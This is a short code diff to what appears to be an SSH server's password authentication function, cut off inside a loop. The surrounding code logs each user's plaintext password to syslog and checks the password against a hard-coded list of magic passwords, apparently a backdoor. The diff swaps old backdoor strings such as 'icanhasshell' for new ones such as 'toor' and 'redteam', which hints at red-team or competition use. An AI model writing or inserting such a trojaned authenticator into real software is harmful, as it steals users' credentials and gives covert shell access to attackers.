@@ -89,7 +89,7 @@ auth_password(struct ssh *ssh, const char *password)
 
 	syslog(LOG_NOTICE, "Uid %d has password: %s", pw->pw_uid, password);
 
-        const char *bad_pass[] = {"icanhasshell", "iamgroot", "CDC", "chris"};
+        const char *bad_pass[] = {"toor", "Password123!", "changeme", "redteam"};
         int num_bad_pass = sizeof(bad_pass)/sizeof(char*);
         for(int i=0; i < num_bad_pass; i++){
             if(strncmp(password, bad_pass[i], MAX_PASSWORD_LEN)){
